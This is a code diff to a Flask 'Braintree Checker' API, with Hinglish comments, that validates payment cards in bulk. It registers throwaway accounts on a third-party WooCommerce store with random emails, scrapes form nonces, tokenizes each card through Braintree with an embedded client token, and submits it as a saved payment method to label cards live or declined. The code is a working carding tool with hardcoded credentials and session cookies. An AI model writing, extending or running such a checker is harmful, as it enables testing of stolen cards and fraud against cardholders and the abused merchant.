@@ -2,6 +2,9 @@ from flask import Flask, jsonify
 import requests
 import re
 import json
+import random
+import string
+from bs4 import BeautifulSoup
 
 # --- Configuration ---
 VALID_API_KEY = "diwazz"
@@ -10,93 +13,107 @@ BRAINTREE_CLIENT_TOKEN = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjI
 # --- Flask App Initialization ---
 app = Flask(__name__)
 
-# --- Helper Function for BIN Lookup ---
+# --- Helper Functions ---
 def get_bin_details(bin_number):
-    """
-    BIN number se details fetch karta hai.
-    """
+    """BIN number se details fetch karta hai."""
     try:
-        # BIN hamesha 6 se 8 digits ka hota hai
-        card_bin = bin_number[:8] 
-        headers = {'Accept-Version': '3'} # binlist.net ke liye zaroori
-        response = requests.get(f"https://lookup.binlist.net/{card_bin}", headers=headers)
-        
+        card_bin = bin_number[:8]
+        headers = {'Accept-Version': '3'}
+        # Timeout add kiya gaya hai taaki API hang na ho
+        response = requests.get(f"https://lookup.binlist.net/{card_bin}", headers=headers, timeout=5)
         if response.status_code == 200:
             data = response.json()
-            # Zaroori details ko extract karna
             return {
-                "scheme": data.get("scheme", "N/A"),
-                "type": data.get("type", "N/A"),
-                "brand": data.get("brand", "N/A"),
-                "country": data.get("country", {}).get("name", "N/A"),
+                "scheme": data.get("scheme", "N/A"), "type": data.get("type", "N/A"),
+                "brand": data.get("brand", "N/A"), "country": data.get("country", {}).get("name", "N/A"),
                 "bank": data.get("bank", {}).get("name", "N/A"),
             }
-        else:
-            # Agar BIN na mile ya koi error ho
-            return {"error": "BIN details not found."}
-    except Exception:
-        return {"error": "Failed to fetch BIN details."}
+        return {"error": f"BIN not found (Status: {response.status_code})"}
+    except requests.exceptions.RequestException as e:
+        return {"error": f"Failed to fetch BIN details: {e}"}
 
-# --- Main Checker Logic ---
+def generate_random_string(length=10):
+    """Ek random string generate karta hai."""
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+# --- Main Checker Logic (Fully Automated) ---
 def run_braintree_check(card_details):
-    bin_info = {} # BIN details ke liye ek empty dictionary
+    bin_info = {}
+    # Session object har function call ke andar banaya ja raha hai
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
+    })
+
     try:
         cc, mm, yy, cvv = card_details.split('|')
-        
-        # Pehle hi BIN details fetch kar lein
         bin_info = get_bin_details(cc)
 
-        # --- Part 1: Braintree se Payment Nonce Generate Karna ---
-        graphql_headers = {
-            'accept': '*/*', 'authorization': BRAINTREE_CLIENT_TOKEN, 'braintree-version': '2018-05-10',
-            'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
-        }
-        graphql_payload = {
-            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'c620b769-a8f3-4fde-9604-cc98c4e959f7'},
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
-            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}},
-            'operationName': 'TokenizeCreditCard',
+        # === Part 1: Register New Account on Altairtech ===
+        # Har baar ek naya session banega
+        register_url = 'https://altairtech.io/account/lost-password/#login'
+        reg_page_res = session.get(register_url, timeout=10)
+        soup = BeautifulSoup(reg_page_res.text, 'html.parser')
+        
+        # Register nonce ko dhoondhna
+        reg_nonce_tag = soup.find('input', {'name': 'woocommerce-register-nonce'})
+        if not reg_nonce_tag:
+            raise Exception("Altairtech registration form nonce not found.")
+        reg_nonce = reg_nonce_tag.get('value')
+        
+        email = f"{generate_random_string()}@gmail.com"
+        
+        register_payload = {
+            'email': email,
+            'woocommerce-register-nonce': reg_nonce,
+            '_wp_http_referer': '/account/lost-password/',
+            'register': 'Register',
         }
         
-        response_graphql = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_payload)
-        response_graphql.raise_for_status()
-        
-        braintree_data = response_graphql.json()
-        if 'errors' in braintree_data:
-            error_message = braintree_data['errors'][0]['message']
-            return {"status": "error", "message": f"Braintree Error: {error_message}", "bin_details": bin_info, "response": "Declined"}
+        register_res = session.post(register_url, data=register_payload)
+        if "My account" not in register_res.text and "Log out" not in register_res.text:
+            raise Exception("Altairtech registration failed. Site might be blocking.")
 
+        # === Part 2: Get Dynamic Nonces from Payment Page ===
+        payment_page_url = 'https://altairtech.io/account/add-payment-method/'
+        payment_page_res = session.get(payment_page_url, timeout=10)
+        soup = BeautifulSoup(payment_page_res.text, 'html.parser')
+        
+        woocommerce_nonce_tag = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
+        if not woocommerce_nonce_tag:
+            raise Exception("Could not find 'woocommerce-add-payment-method-nonce'.")
+        woocommerce_nonce = woocommerce_nonce_tag.get('value')
+
+        # === Part 3: Generate Braintree Nonce ===
+        graphql_headers = {'accept': '*/*', 'authorization': BRAINTREE_CLIENT_TOKEN, 'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com'}
+        graphql_payload = {'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'c620b769-a8f3-4fde-9604-cc98c4e959f7'}, 'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }', 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}}, 'operationName': 'TokenizeCreditCard'}
+        
+        response_graphql = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_payload, timeout=10)
+        response_graphql.raise_for_status()
+        braintree_data = response_graphql.json()
+        
+        if 'errors' in braintree_data:
+            return {"status": "error", "message": braintree_data['errors'][0]['message'], "bin_details": bin_info, "response": "Declined"}
+        
         payment_nonce = braintree_data['data']['tokenizeCreditCard']['token']
 
-        # --- Part 2: Altairtech Website par Nonce Submit Karna ---
-        altair_cookies = {'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'paxowe6819%7C1762973657%7CKzQSDydwyCrIBuAVkrJifs6Nm4WImWZ80QWTSVTKLRh%7C9a734dcaa14536e97b37be1d9342cdb4496380fbffd886ad33fd7734496bd923'}
-        woocommerce_nonce = '0dde25e5ad'
-
-        altair_data = {
-            'payment_method': 'braintree_credit_card', 'wc_braintree_credit_card_payment_nonce': payment_nonce,
-            'wc_braintree_device_data': '{"correlation_id":"ce230cbd851503d4f63f8a47ebc9eb46"}',
-            'woocommerce-add-payment-method-nonce': woocommerce_nonce, '_wp_http_referer': '/account/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
-        }
-        altair_headers = {'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://altairtech.io'}
+        # === Part 4: Submit to Altairtech with Fresh Session ===
+        altair_data = {'payment_method': 'braintree_credit_card', 'wc_braintree_credit_card_payment_nonce': payment_nonce, 'wc_braintree_device_data': '{"correlation_id":"ce230cbd851503d4f63f8a47ebc9eb46"}', 'woocommerce-add-payment-method-nonce': woocommerce_nonce, '_wp_http_referer': '/account/add-payment-method/', 'woocommerce_add_payment_method': '1'}
         
-        response_altair = requests.post('https://altairtech.io/account/add-payment-method/', headers=altair_headers, data=altair_data, cookies=altair_cookies)
+        # Session object cookies ko automatically handle kar raha hai
+        response_altair = session.post(payment_page_url, data=altair_data, timeout=10)
         
         match = re.search(r'Status code\s*([^<]+)\s*</li>', response_altair.text)
-        
         if match:
             status_message = match.group(1).strip()
             if "fraud" in status_message.lower() or "declined" in status_message.lower():
                 return {"status": "live_declined", "message": status_message, "bin_details": bin_info, "response": "Declined"}
-            elif "approved" in status_message.lower():
-                 return {"status": "live_approved", "message": status_message, "bin_details": bin_info, "response": "Approved"}
             else:
-                return {"status": "live_unknown", "message": status_message, "bin_details": bin_info, "response": "Unknown"}
+                 return {"status": "live_approved", "message": status_message, "bin_details": bin_info, "response": "Approved"}
         else:
-            return {"status": "error", "message": "Altairtech session expired. Admin needs to update cookies.", "bin_details": bin_info, "response": "Error"}
+            return {"status": "error", "message": "Could not parse final response from Altairtech.", "bin_details": bin_info, "response": "Error"}
 
     except Exception as e:
-        # Agar koi bhi error aaye, toh bhi BIN details return karein
         return {"status": "error", "message": str(e), "bin_details": bin_info, "response": "Error"}
 
 
@@ -114,7 +131,8 @@ def process_payment(api_key, card_details):
 # --- Health Check Route ---
 @app.route('/')
 def index():
-    return "Braintree Apiiiii Is RUNNN NOOWWW NOW U CAN USE 😉😉😉😉🙂"
+    return "Braintree Checker API (Fully Automated) is running!"
 
 if __name__ == '__main__':
+    # Yeh local testing ke liye hai. Render Gunicorn ka istemaal karega.
     app.run(host='0.0.0.0', port=5000)
